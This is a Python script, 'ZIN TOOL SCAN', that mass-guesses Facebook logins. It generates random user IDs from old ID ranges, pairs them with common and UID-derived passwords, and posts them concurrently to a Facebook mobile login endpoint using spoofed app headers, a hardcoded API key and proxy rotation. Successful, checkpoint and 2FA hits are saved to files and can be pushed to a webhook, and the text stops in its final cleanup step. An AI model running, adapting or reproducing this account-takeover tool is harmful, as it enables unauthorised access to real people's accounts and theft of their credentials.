#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════╗
║                                                                                                                                                     ║
║                                                          ZIN SCAN VIA - VĨNH HẰNG THIÊN TÔN                    ║                                                                           ║
║                                                                                                                                                     ║
╚══════════════════════════════════════════════════════════╝
"""

import os
import sys
import io
import json
import uuid
import string
import random
import time
import re
import signal
import csv
import asyncio
from datetime import datetime
from pathlib import Path

# ─── Dependency check (không auto-install) ───
_MISSING = []
try:
    import httpx
except ImportError:
    _MISSING.append("httpx")
try:
    import aiofiles
except ImportError:
    _MISSING.append("aiofiles")
if _MISSING:
    sys.stderr.write(
        f"ERROR: Missing: {', '.join(_MISSING)}\n"
        f"Install: pip install {' '.join(_MISSING)}\n"
    )
    sys.exit(1)

# httpx API detection
try:
    _HTTPX_VER = tuple(int(x) for x in httpx.__version__.split(".")[:2]
                        if x.isdigit())
except (ValueError, AttributeError):
    _HTTPX_VER = (0, 0)
_HTTPX_NEW_PROXY_API = _HTTPX_VER >= (0, 26)


# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════
CONFIG = {
    "output_dir": "/sdcard" if os.path.isdir("/sdcard") else str(Path.home()),
    "state_file": "zin_state.json",
    "proxy_file": "proxies.txt",
    "concurrency": 100,
    "queue_maxsize": 500,
    "worker_poll_timeout": 0.25,
    "shutdown_grace": 30.0,
    "rate_limit": 0,
    "max_retries": 3,
    "retry_backoff": 2.0,
    "timeout": 15.0,
    "enable_proxy": False,
    "enable_resume": True,
    "smart_passwords": True,
    "notify_webhook": "",
    "webhook_timeout": 10.0,
    "save_formats": ["txt", "json", "csv"],
    "max_limit": 1_000_000,
    "verify_tls": True,
    "dry_run": False,
    "beep": True,
}


# ═══════════════════════════════════════════════════════════
# ANSI
# ═══════════════════════════════════════════════════════════
class C:
    R  = '\033[0m'; B  = '\033[1m'; D  = '\033[2m'
    RED    = '\033[38;5;196m'; ORANGE = '\033[38;5;208m'
    YELLOW = '\033[38;5;226m'; GREEN  = '\033[38;5;46m'
    CYAN   = '\033[38;5;51m';  BLUE   = '\033[38;5;27m'
    PURPLE = '\033[38;5;129m'; PINK   = '\033[38;5;213m'
    GOLD   = '\033[38;5;220m'; WHITE  = '\033[38;5;231m'
    GRAY   = '\033[38;5;245m'; LIME   = '\033[38;5;154m'
    AQUA   = '\033[38;5;123m'; VIOLET = '\033[38;5;171m'
    CRIMSON= '\033[38;5;161m'; SKY    = '\033[38;5;117m'
    CLEAR  = '\033[K'

RAINBOW  = [C.RED, C.ORANGE, C.YELLOW, C.GREEN, C.CYAN, C.BLUE, C.PURPLE]
RAINBOW2 = [C.PINK, C.CRIMSON, C.ORANGE, C.GOLD, C.LIME, C.AQUA, C.SKY, C.VIOLET]


# ═══════════════════════════════════════════════════════════
# UI
# ═══════════════════════════════════════════════════════════
def rainbow(text, palette=None):
    palette = palette or RAINBOW
    return "".join(palette[i % len(palette)] + ch
                   for i, ch in enumerate(text)) + C.R

def rainbow_border(char="═", width=58, palette=None):
    palette = palette or RAINBOW
    return "".join(palette[i % len(palette)] + char
                   for i in range(width)) + C.R

def centered_box(text, width=58):
    if len(text) + 2 > width:
        width = len(text) + 4
    top    = "╔" + "═" * (width - 2) + "╗"
    bottom = "╚" + "═" * (width - 2) + "╝"
    blank  = "║" + " " * (width - 2) + "║"
    pad_total = (width - 2) - len(text)
    pad_left  = pad_total // 2
    pad_right = pad_total - pad_left
    print(rainbow(top))
    print(rainbow(blank, palette=RAINBOW2))
    print(C.CYAN + "║" + C.R + " " * pad_left +
          rainbow(text, palette=RAINBOW) +
          " " * pad_right + C.CYAN + "║" + C.R)
    print(rainbow(blank, palette=RAINBOW2))
    print(rainbow(bottom))

def print_logo():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except OSError:
        pass
    print()
    print("  " + rainbow_border("✦", 58))
    print()
    centered_box("ZIN TOOL SCAN - VHCT", width=58)
    print()
    print("  " + rainbow_border("✦", 58, palette=RAINBOW2))
    print()

def mini_sep():
    print(f"  {C.GRAY}{'·' * 58}{C.R}")

def safe_beep():
    if CONFIG["beep"]:
        try:
            sys.stdout.write('\a'); sys.stdout.flush()
        except OSError:
            pass


# ═══════════════════════════════════════════════════════════
# UID GENERATOR
# ═══════════════════════════════════════════════════════════
SERIES_MAP = {
    "1": ("2011-2012", ("100009",), 9),
    "2": ("2010",      ("10001",), 10),
    "3": ("2009",      ("1000000","1000001","1000002",
                        "1000003","1000004","1000005"), 9),
    "4": ("2008",      ("1000000",), 8),
    "5": ("2007",      ("10000000",), 7),
    "6": ("2005-2006", ("100000000",), 6),
}

def generate_uid(prefixes, body_len):
    if not prefixes:
        raise ValueError("prefixes rỗng")
    if not (1 <= body_len <= 15):
        raise ValueError(f"body_len không hợp lệ: {body_len}")
    pfx  = random.choice(prefixes)
    body = ''.join(random.choice(string.digits) for _ in range(body_len))
    uid  = pfx + body
    if not uid.isdigit():
        raise RuntimeError(f"UID sinh chứa ký tự lạ: {uid!r}")
    return uid

def generate_uid_batch_unique(prefixes, body_len, count):
    """Sinh UID unique trong 1 batch (dedup với set)."""
    seen = set()
    uids = []
    attempts = 0
    max_attempts = count * 10 + 1000
    while len(uids) < count and attempts < max_attempts:
        uid = generate_uid(prefixes, body_len)
        attempts += 1
        if uid not in seen:
            seen.add(uid)
            uids.append(uid)
    return uids


# ═══════════════════════════════════════════════════════════
# PASSWORD STRATEGY
# ═══════════════════════════════════════════════════════════
class PasswordStrategy:
    BASE = (
        '123456', '1234567', '12345678', '123456789', '1234567890',
        '123123', '112233', 'password', 'password123', 'qwerty',
        'abc123', '111111', 'iloveyou', 'admin', 'welcome',
        'monkey', 'login', 'letmein', '000000', '00000000',
        '12345678a', '12345678Aa', 'Aa123456', 'aA123456',
    )
    VN_COMMON = (
        'khongco', 'matkhau', 'chaoem', 'yeuem', 'anhyeuem',
        'emyeuanh', '123456a', '123456ab', 'yeu123',
    )
    YEARS = ("1990","1991","1992","1993","1994","1995","1996","1997",
             "1998","1999","2000","2001","2002","2003","2004","2005",
             "2006","2007")

    @staticmethod
    def generate(uid: str) -> list:
        pw_set = set(PasswordStrategy.BASE)
        if CONFIG["smart_passwords"]:
            digits = re.findall(r'\d+', uid)
            if digits:
                tail = digits[-1][-8:]
                pw_set.add(tail)
                pw_set.add(tail[-6:])
                pw_set.add(tail[-8:])
                pw_set.add(tail + "a")
                pw_set.add("a" + tail)
                pw_set.add(tail + "Aa")
                pw_set.add(tail[::-1])
                for year in PasswordStrategy.YEARS:
                    if year in tail:
                        pw_set.add(year)
                        pw_set.add("sinh" + year)
                        pw_set.add("fb" + year)
                if len(tail) >= 6:
                    last6 = tail[-6:]
                    pw_set.add(last6 + "a")
                    pw_set.add(last6 + "A")
                    pw_set.add("a" + last6)
            for pw in PasswordStrategy.VN_COMMON:
                pw_set.add(pw)
        pw_set.discard("")
        return list(pw_set)


# ═══════════════════════════════════════════════════════════
# PROXY MANAGER
# ═══════════════════════════════════════════════════════════
class ProxyManager:
    SCHEMES = ("http://", "https://", "socks4://", "socks5://")

    def __init__(self, proxy_file):
        self.proxies = []
        self.dead = set()
        self.idx = 0
        self.lock = asyncio.Lock()
        if CONFIG["enable_proxy"] and Path(proxy_file).is_file():
            try:
                with open(proxy_file, encoding="utf-8") as f:
                    for raw in f:
                        line = raw.strip()
                        if not line or line.startswith("#"):
                            continue
                        if not line.startswith(self.SCHEMES):
                            line = "http://" + line
                        self.proxies.append(line)
            except OSError as e:
                sys.stderr.write(
                    f"[ProxyManager] Không đọc {proxy_file}: {e}\n")

    async def get(self):
        if not self.proxies:
            return None
        async with self.lock:
            if len(self.dead) >= len(self.proxies):
                self.dead.clear()
            for _ in range(len(self.proxies)):
                p = self.proxies[self.idx % len(self.proxies)]
                self.idx += 1
                if p not in self.dead:
                    return p
            self.dead.clear()
            p = self.proxies[self.idx % len(self.proxies)]
            self.idx += 1
            return p

    async def mark_dead(self, proxy):
        if proxy:
            async with self.lock:
                self.dead.add(proxy)


# ═══════════════════════════════════════════════════════════
# STATS
# ═══════════════════════════════════════════════════════════
class Stats:
    def __init__(self):
        self.start_time = time.time()
        self.tried = 0
        self.ok = 0
        self.cp = 0
        self.twofa = 0
        self.err = 0          # network / other errors
        self.out_err = 0      # output manager errors
        self.retry = 0

    def uptime(self):
        return max(1e-6, time.time() - self.start_time)

    def rate(self):
        return self.tried / self.uptime()

    def status_line(self):
        total_err = self.err + self.out_err
        return (
            f"\r  {C.PURPLE}✦{C.R} "
            f"{C.GRAY}OK:{C.R}{C.GREEN}{self.ok:<4}{C.R}"
            f"{C.GRAY}│{C.R}"
            f"{C.GOLD}CP:{C.R}{C.YELLOW}{self.cp:<4}{C.R}"
            f"{C.GRAY}│{C.R}"
            f"{C.RED}2FA:{C.R}{C.PINK}{self.twofa:<3}{C.R}"
            f"{C.GRAY}│{C.R}"
            f"{C.RED}Err:{C.R}{C.CRIMSON}{total_err:<3}{C.R}"
            f"{C.GRAY}│{C.R}"
            f"{C.CYAN}Try:{C.R}{C.WHITE}{self.tried:<6}{C.R}"
            f"{C.GRAY}│{C.R}"
            f"{C.VIOLET}{self.rate():.0f}/s{C.R}"
            f"{C.CLEAR}"
        )


# ═══════════════════════════════════════════════════════════
# OUTPUT MANAGER (fixed CSV bug)
# ═══════════════════════════════════════════════════════════
class OutputManager:
    KINDS = ("ok", "cp", "2fa")

    def __init__(self, out_dir):
        self.out_dir = Path(out_dir)
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        self.files = {}
        self.locks = {}
        self._init_files_sync()

    def _init_files_sync(self):
        """Sync init — tránh race với asyncio.create_task."""
        for kind in self.KINDS:
            self.files[kind] = {
                "txt":   self.out_dir / f"zin_{kind}_{self.timestamp}.txt",
                "jsonl": self.out_dir / f"zin_{kind}_{self.timestamp}.jsonl",
                "json":  self.out_dir / f"zin_{kind}_{self.timestamp}.json",
                "csv":   self.out_dir / f"zin_{kind}_{self.timestamp}.csv",
            }
            for f in self.files[kind].values():
                self.locks[f] = asyncio.Lock()

            if "csv" in CONFIG["save_formats"]:
                try:
                    with open(self.files[kind]["csv"], "w",
                              encoding="utf-8", newline="") as f:
                        # f có .write() → csv.writer OK
                        csv.writer(f).writerow(
                            ["uid", "password", "status", "proxy", "timestamp"])
                except OSError as e:
                    sys.stderr.write(
                        f"[OutputManager] Init CSV lỗi ({kind}): {e}\n")

            if "json" in CONFIG["save_formats"]:
                try:
                    self.files[kind]["jsonl"].touch(exist_ok=True)
                except OSError as e:
                    sys.stderr.write(
                        f"[OutputManager] Touch jsonl lỗi ({kind}): {e}\n")

    async def save(self, kind, uid, password, status="ok", proxy=""):
        """
        Ghi 1 record vào tất cả format được bật.
        - Nếu 1 format fail → vẫn thử các format khác.
        - Nếu TẤT CẢ format fail → raise IOError.
        """
        rec = {
            "uid": uid, "password": password, "status": status,
            "proxy": proxy or "",
            "timestamp": datetime.now().isoformat(),
        }
        formats  = CONFIG["save_formats"]
        errors   = []
        succeeded = 0

        # ─── TXT ───
        if "txt" in formats:
            try:
                async with self.locks[self.files[kind]["txt"]]:
                    async with aiofiles.open(self.files[kind]["txt"], "a",
                                              encoding="utf-8") as f:
                        await f.write(f"{uid}|{password}\n")
                succeeded += 1
            except OSError as e:
                errors.append(f"txt: {e}")

        # ─── JSONL ───
        if "json" in formats:
            try:
                async with self.locks[self.files[kind]["jsonl"]]:
                    async with aiofiles.open(self.files[kind]["jsonl"], "a",
                                              encoding="utf-8") as f:
                        await f.write(json.dumps(rec, ensure_ascii=False)
                                      + "\n")
                succeeded += 1
            except OSError as e:
                errors.append(f"jsonl: {e}")

        # ─── CSV — FIX: dùng io.StringIO ───
        if "csv" in formats:
            try:
                buf = io.StringIO()
                try:
                    csv.writer(buf).writerow(
                        [uid, password, status, proxy or "",
                         rec["timestamp"]])
                    line = buf.getvalue()
                finally:
                    buf.close()

                async with self.locks[self.files[kind]["csv"]]:
                    async with aiofiles.open(self.files[kind]["csv"], "a",
                                              encoding="utf-8") as f:
                        await f.write(line)
                succeeded += 1
            except (OSError, csv.Error, ValueError) as e:
                errors.append(f"csv: {e}")

        # ─── Kiểm tra kết quả ───
        if formats and succeeded == 0:
            raise IOError(
                f"OutputManager.save({kind}) thất bại hoàn toàn: "
                f"{'; '.join(errors)}"
            )
        if errors:
            sys.stderr.write(
                f"[OutputManager] Cảnh báo save({kind}): "
                f"{len(errors)} format lỗi: {'; '.join(errors)}\n"
            )

    async def finalize(self):
        """Build JSON array từ JSONL, atomic write."""
        for kind in self.KINDS:
            if "json" not in CONFIG["save_formats"]:
                continue
            jsonl_path = self.files[kind]["jsonl"]
            json_path  = self.files[kind]["json"]
            records    = []

            try:
                if jsonl_path.exists():
                    async with self.locks[jsonl_path]:
                        async with aiofiles.open(jsonl_path, "r",
                                                  encoding="utf-8") as f:
                            async for line in f:
                                line = line.strip()
                                if not line:
                                    continue
                                try:
                                    records.append(json.loads(line))
                                except json.JSONDecodeError:
                                    continue
            except OSError as e:
                sys.stderr.write(
                    f"[OutputManager] Đọc jsonl lỗi ({kind}): {e}\n")

            tmp = json_path.with_suffix(".json.tmp")
            try:
                async with aiofiles.open(tmp, "w", encoding="utf-8") as f:
                    await f.write(json.dumps(records,
                                              ensure_ascii=False, indent=2))
                tmp.replace(json_path)
            except OSError as e:
                sys.stderr.write(
                    f"[OutputManager] Ghi json lỗi ({kind}): {e}\n")


# ═══════════════════════════════════════════════════════════
# STATE MANAGER
# ═══════════════════════════════════════════════════════════
class StateManager:
    MAX_MEMORY_TESTED = 100_000

    def __init__(self, path):
        self.path = Path(path)
        self.data = {"last_uid": None, "tested": [], "series": ""}
        if CONFIG["enable_resume"] and self.path.is_file():
            try:
                with open(self.path, encoding="utf-8") as f:
                    loaded = json.load(f)
                    if isinstance(loaded, dict):
                        self.data.update(loaded)
            except (OSError, json.JSONDecodeError) as e:
                sys.stderr.write(f"[StateManager] Bỏ qua state lỗi: {e}\n")
        self.tested_set = set(self.data.get("tested", []))
        self._save_lock = asyncio.Lock()

    def is_tested(self, uid):
        return uid in self.tested_set

    async def mark_tested(self, uid):
        self.tested_set.add(uid)
        if len(self.tested_set) > self.MAX_MEMORY_TESTED:
            keep = list(self.tested_set)[-int(self.MAX_MEMORY_TESTED * 0.75):]
            self.tested_set = set(keep)
        self.data["tested"] = list(self.tested_set)
        self.data["last_uid"] = uid

    async def save(self):
        async with self._save_lock:
            tmp = self.path.with_suffix(".json.tmp")
            try:
                async with aiofiles.open(tmp, "w", encoding="utf-8") as f:
                    await f.write(json.dumps(self.data,
                                              ensure_ascii=False, indent=2))
                tmp.replace(self.path)
            except OSError as e:
                sys.stderr.write(f"[StateManager] Save lỗi: {e}\n")


# ═══════════════════════════════════════════════════════════
# ASYNC CHECKER
# ═══════════════════════════════════════════════════════════
UA_POOL = (
    'Dalvik/1.6.0 (Linux; U; Android 6.0.1; Nexus 6P Build/MMB29P) '
    '[FBAN/FB4A;FBAV/109.0.0.15.70;]',
    'Dalvik/2.1.0 (Linux; U; Android 11; SM-A125F Build/RP1A.200720.012) '
    '[FBAN/FB4A;FBAV/300.0.0.30.115;]',
    'Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/SP1A.210812.016) '
    '[FBAN/FB4A;FBAV/350.0.0.32.105;]',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 '
    'Chrome/120.0.0.0 Mobile',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
    'Chrome/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
    'AppleWebKit/605.1.15 Safari/605.1.15',
)

API_URL = "https://b-graph.facebook.com/auth/login"


class AsyncChecker:
    def __init__(self, proxy_mgr, stats, outputs, state):
        self.proxy_mgr = proxy_mgr
        self.stats     = stats
        self.outputs   = outputs
        self.state     = state
        self.semaphore = asyncio.Semaphore(CONFIG["concurrency"])
        self.rate_lock = asyncio.Lock()
        self.last_req  = 0.0
        self.client    = None

    async def __aenter__(self):
        limits = httpx.Limits(
            max_connections=CONFIG["concurrency"] + 50,
            max_keepalive_connections=CONFIG["concurrency"],
        )
        self.client = httpx.AsyncClient(
            timeout=CONFIG["timeout"],
            limits=limits,
            verify=CONFIG["verify_tls"],
            follow_redirects=True,
            http2=False,
        )
        return self

    async def __aexit__(self, *args):
        if self.client:
            try:
                await self.client.aclose()
            except Exception as e:
                sys.stderr.write(f"[Checker] close client lỗi: {e}\n")

    async def _rate_limit(self):
        if CONFIG["rate_limit"] <= 0:
            return
        async with self.rate_lock:
            now = time.time()
            min_interval = 1.0 / CONFIG["rate_limit"]
            delta = now - self.last_req
            if delta < min_interval:
                await asyncio.sleep(min_interval - delta)
            self.last_req = time.time()

    def _build_request(self, uid, password):
        data = {
            'adid': str(uuid.uuid4()),
            'email': uid,
            'password': password,
            'cpl': 'true',
            'credentials_type': 'device_based_login_password',
            'source': 'device_based_login',
            'error_detail_type': 'button_with_disabled',
            'format': 'json',
            'generate_session_cookies': '1',
            'generate_analytics_claim': '1',
            'generate_machine_id': '1',
            'family_device_id': str(uuid.uuid4()),
            'advertiser_id': str(uuid.uuid4()),
            'locale': 'en_US',
            'client_country_code': 'US',
            'device_id': str(uuid.uuid4()),
            'method': 'auth.login',
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class':
                'com.facebook.account.login.protocol.Fb4aAuthHandler',
        }
        headers = {
            'content-type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'Authorization':
                'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'user-agent': random.choice(UA_POOL),
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-device-group': '5120',
            'x-fb-session-id':
                'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid='
                + uuid.uuid4().hex,
            'x-fb-connection-bandwidth':
                str(random.randint(20000000, 30000000)),
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': uuid.uuid4().hex,
            'x-fb-friendly-name': 'ViewerReactionsMutation',
            'accept-encoding': 'gzip, deflate',
            'x-fb-http-engine': 'Liger',
        }
        return data, headers

    def _proxy_kwargs(self, proxy):
        if not proxy:
            return {}
        if _HTTPX_NEW_PROXY_API:
            return {"proxy": proxy}
        return {"proxies": {"all://": proxy}}

    async def _single_request(self, uid, password, proxy=None):
        if CONFIG["dry_run"]:
            return {"_dry_run": True}, None
        data, headers = self._build_request(uid, password)
        try:
            r = await self.client.post(
                API_URL, data=data, headers=headers,
                **self._proxy_kwargs(proxy),
            )
            if r.status_code >= 500:
                return None, f"http_{r.status_code}"
            if r.status_code == 429:
                return None, "http_429"
            try:
                return r.json(), None
            except ValueError:
                return None, "invalid_json"
        except httpx.TimeoutException:
            return None, "timeout"
        except httpx.ProxyError:
            return None, "proxy_dead"
        except httpx.ConnectError:
            return None, "connect_error"
        except httpx.HTTPError as e:
            return None, f"http_{type(e).__name__}"
        except Exception as e:
            return None, f"err_{type(e).__name__}"

    async def _request_with_retry(self, uid, password, proxy=None):
        last_err = None
        for attempt in range(CONFIG["max_retries"]):
            if attempt > 0:
                self.stats.retry += 1
            resp, err = await self._single_request(uid, password, proxy)
            if resp is not None:
                return resp, None, proxy
            last_err = err
            if err == "proxy_dead" and proxy:
                await self.proxy_mgr.mark_dead(proxy)
                proxy = await self.proxy_mgr.get()
            if err in ("http_429", "http_503"):
                wait = CONFIG["retry_backoff"] ** attempt + random.uniform(0, 1)
                await asyncio.sleep(wait)
            else:
                await asyncio.sleep(0.5 * (attempt + 1))
        return None, last_err, proxy

    # ═══ WRAPPER: BẮT MỌI EXCEPTION ═══
    async def check_account(self, uid):
        try:
            await self._check_account_inner(uid)
        except asyncio.CancelledError:
            raise
        except IOError as e:
            self.stats.out_err += 1
            sys.stderr.write(
                f"[Checker] OUTPUT ERROR uid={uid}: {e}\n")
            self._render_status()
        except Exception as e:
            self.stats.err += 1
            sys.stderr.write(
                f"[Checker] EXCEPTION uid={uid}: "
                f"{type(e).__name__}: {e}\n")
            self._render_status()

    async def _check_account_inner(self, uid):
        if self.state.is_tested(uid):
            return
        passwords = PasswordStrategy.generate(uid)
        proxy = await self.proxy_mgr.get()

        for pwd in passwords:
            async with self.semaphore:
                await self._rate_limit()
                resp, err, proxy = await self._request_with_retry(
                    uid, pwd, proxy)

            self.stats.tried += 1
            self._render_status()

            if resp is None:
                self.stats.err += 1
                continue

            if CONFIG["dry_run"]:
                self._render_success(uid, pwd, proxy)
                # Chỉ tăng OK SAU KHI save thành công
                await self.outputs.save("ok", uid, pwd, "ok", proxy)
                self.stats.ok += 1
                break

            if 'access_token' in resp:
                self._render_success(uid, pwd, proxy)
                await self.outputs.save("ok", uid, pwd, "ok", proxy)
                self.stats.ok += 1
                try:
                    await self._notify_webhook("OK", uid, pwd, proxy)
                except Exception:
                    pass
                break

            err_obj = resp.get('error', {}) if isinstance(resp, dict) else {}
            msg  = str(err_obj.get('message', ''))
            code = err_obj.get('code', 0)

            if 'www.facebook.com' in msg or code == 401:
                self._render_cp(uid, pwd, proxy)
                await self.outputs.save("cp", uid, pwd, "checkpoint", proxy)
                self.stats.cp += 1
                try:
                    await self._notify_webhook("CP", uid, pwd, proxy)
                except Exception:
                    pass
                break

            if 'two-factor' in msg.lower() or 'two_factor' in msg.lower():
                self._render_2fa(uid, pwd, proxy)
                await self.outputs.save("2fa", uid, pwd, "2fa", proxy)
                self.stats.twofa += 1
                try:
                    await self._notify_webhook("2FA", uid, pwd, proxy)
                except Exception:
                    pass
                break

        await self.state.mark_tested(uid)
        if (self.stats.tried % 50) == 0:
            await self.state.save()

    def _render_status(self):
        try:
            sys.stdout.write(self.stats.status_line())
            sys.stdout.flush()
        except OSError:
            pass

    def _box(self, color, title, uid, pwd, proxy):
        # Reset về đầu dòng trước khi in box
        sys.stdout.write("\r" + C.CLEAR)
        try:
            bar = "═" * 45
            print(f"  {color}{C.B}╔{bar}╗{C.R}")
            print(f"  {color}{C.B}║{C.R} {C.WHITE}{C.B}{title}{C.R}")
            print(f"  {color}{C.B}║{C.R} {C.CYAN}UID  :{C.R} {C.WHITE}{uid}{C.R}")
            print(f"  {color}{C.B}║{C.R} {C.YELLOW}PASS :{C.R} {C.WHITE}{pwd}{C.R}")
            if proxy:
                print(f"  {color}{C.B}║{C.R} {C.GRAY}PROXY:{C.R} {C.WHITE}{proxy}{C.R}")
            print(f"  {color}{C.B}╚{bar}╝{C.R}")
        except OSError:
            pass
        safe_beep()

    def _render_success(self, uid, pwd, proxy):
        self._box(C.GREEN, "✨ SUCCESS ✨", uid, pwd, proxy)

    def _render_cp(self, uid, pwd, proxy):
        self._box(C.GOLD, "◐ CHECKPOINT ◐", uid, pwd, proxy)

    def _render_2fa(self, uid, pwd, proxy):
        self._box(C.PINK, "🔐 2FA DETECTED", uid, pwd, proxy)

    async def _notify_webhook(self, status, uid, pwd, proxy):
        if not CONFIG["notify_webhook"] or not self.client:
            return
        payload = {
            "content": f"**[{status}]** Hit!\n"
                       f"UID: `{uid}`\nPASS: `{pwd}`\n"
                       f"Proxy: `{proxy or 'none'}`"
        }
        try:
            await asyncio.wait_for(
                self.client.post(CONFIG["notify_webhook"], json=payload),
                timeout=CONFIG["webhook_timeout"],
            )
        except (httpx.HTTPError, asyncio.TimeoutError):
            pass


# ═══════════════════════════════════════════════════════════
# SIGNAL HANDLERS
# ═══════════════════════════════════════════════════════════
_STOP_EVENT: asyncio.Event = None

def install_signal_handlers(loop, stop_event):
    def _handler():
        stop_event.set()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, _handler)
        except (NotImplementedError, RuntimeError, ValueError):
            pass


# ═══════════════════════════════════════════════════════════
# APP
# ═══════════════════════════════════════════════════════════
class ZinApp:
    MENU = (
        ("1", "2011-2012", C.PINK,    "🌸"),
        ("2", "2010",      C.CRIMSON, "🔥"),
        ("3", "2009",      C.ORANGE,  "🍊"),
        ("4", "2008",      C.GOLD,    "🌟"),
        ("5", "2007",      C.LIME,    "🍀"),
        ("6", "2005-2006", C.AQUA,    "💎"),
        ("0", "EXIT",      C.GRAY,    "🚪"),
    )

    def main(self):
        print_logo()
        print(f"  {C.VIOLET}{C.B}[ CHỌN PHƯƠNG PHÁP ]{C.R}")
        mini_sep()
        for num, name, color, icon in self.MENU:
            if name == "EXIT":
                print(f"  {color}{C.B}[{C.WHITE}{num}{color}]{C.R} {icon}  "
                      f"{C.B}{name}{C.R}")
            else:
                print(f"  {color}{C.B}[{C.WHITE}{num}{color}]{C.R} {icon}  "
                      f"{C.B}{name}{C.R} METHOD")
        mini_sep()
        print(f"  {C.GOLD}⚡ ZIN TOOL SCAN - VĨNH HẰNG THIÊN TÔN{C.R}")
        print()
        try:
            sel = input(f"  {C.CYAN}{C.B}➤ Chọn: {C.R}").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            sys.exit(0)

        if sel == "0":
            sys.exit(0)
        if sel not in SERIES_MAP:
            print(f"  {C.RED}✗ Lựa chọn không hợp lệ{C.R}")
            time.sleep(1)
            self.main()
            return

        name, prefixes, body_len = SERIES_MAP[sel]
        self.run(name, prefixes, body_len)

    def run(self, name, prefixes, body_len):
        print_logo()
        print(f"  {C.YELLOW}{C.B}📋 SERIES: {C.WHITE}{name}{C.R}")
        mini_sep()
        print(f"  {C.GRAY}Body length: {body_len} chữ số{C.R}")
        print(f"  {C.GRAY}Ví dụ: 1000, 5000, 10000{C.R}")
        try:
            raw = input(f"  {C.CYAN}{C.B}➤ Số lượng: {C.R}").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            sys.exit(0)

        try:
            limit = int(raw)
        except (ValueError, TypeError):
            print(f"  {C.RED}✗ Không phải số hợp lệ{C.R}")
            time.sleep(1)
            self.run(name, prefixes, body_len)
            return

        if limit <= 0:
            print(f"  {C.RED}✗ Số lượng phải > 0{C.R}")
            time.sleep(1)
            self.run(name, prefixes, body_len)
            return
        if limit > CONFIG["max_limit"]:
            print(f"  {C.RED}✗ Vượt giới hạn ({CONFIG['max_limit']}){C.R}")
            time.sleep(1)
            self.run(name, prefixes, body_len)
            return

        try:
            asyncio.run(self._run_async(name, prefixes, body_len, limit))
        except KeyboardInterrupt:
            print(f"\n  {C.RED}⏹ Dừng bởi người dùng{C.R}")

    async def _run_async(self, name, prefixes, body_len, limit):
        global _STOP_EVENT
        _STOP_EVENT = asyncio.Event()
        loop = asyncio.get_running_loop()
        install_signal_handlers(loop, _STOP_EVENT)

        proxy_mgr = ProxyManager(CONFIG["proxy_file"])
        stats     = Stats()
        outputs   = OutputManager(CONFIG["output_dir"])
        state     = StateManager(CONFIG["state_file"])
        state.data["series"] = name

        # Sinh UIDs (unique trong batch)
        print_logo()
        print(f"  {C.VIOLET}{C.B}⟳ Đang sinh {limit} UIDs...{C.R}")
        uids = generate_uid_batch_unique(prefixes, body_len, limit)
        actual = len(uids)
        if actual < limit:
            print(f"  {C.YELLOW}⚠ Chỉ sinh được {actual}/{limit} UIDs "
                  f"(trùng lặp){C.R}")
        print()

        print_logo()
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} TOTAL IDS   "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{actual}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} SERIES      "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{name}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} CONCURRENCY "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{CONFIG['concurrency']}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} PROXY       "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}"
              f"{len(proxy_mgr.proxies) if CONFIG['enable_proxy'] else 'OFF'}"
              f"{C.R}")
        if CONFIG["dry_run"]:
            print(f"  {C.YELLOW}{C.B}[ ! ]{C.R} "
                  f"{C.YELLOW}DRY-RUN — KHÔNG GỬI REQUEST THẬT{C.R}")
        mini_sep()
        print(f"  {C.GOLD}{C.B}⚡ ZIN TOOL SCAN - VHCT{C.R}")
        mini_sep()
        print()

        # ─── Queue + Workers ───
        async with AsyncChecker(proxy_mgr, stats, outputs, state) as checker:
            queue = asyncio.Queue(maxsize=CONFIG["queue_maxsize"])
            producer_done = asyncio.Event()

            async def producer():
                try:
                    for uid in uids:
                        if _STOP_EVENT.is_set():
                            break
                        await queue.put(uid)
                finally:
                    producer_done.set()

            async def worker():
                while True:
                    try:
                        uid = await asyncio.wait_for(
                            queue.get(),
                            timeout=CONFIG["worker_poll_timeout"],
                        )
                    except asyncio.TimeoutError:
                        if producer_done.is_set() and queue.empty():
                            return
                        continue
                    except asyncio.CancelledError:
                        return
                    try:
                        if not _STOP_EVENT.is_set():
                            await checker.check_account(uid)
                    except asyncio.CancelledError:
                        raise
                    except Exception as e:
                        checker.stats.err += 1
                        sys.stderr.write(
                            f"[Worker] uid={uid} "
                            f"{type(e).__name__}: {e}\n")
                    finally:
                        queue.task_done()

            workers = [asyncio.create_task(worker())
                       for _ in range(CONFIG["concurrency"])]

            producer_task = asyncio.create_task(producer())

            try:
                await producer_task
                await asyncio.gather(*workers, return_exceptions=True)
            except asyncio.CancelledError:
                for w in workers:
                    w.cancel()
                await asyncio.gather(*workers, return_exceptions=True)

        # Finalize output
        try:
            await outputs.finalize()
        except Exception as e:
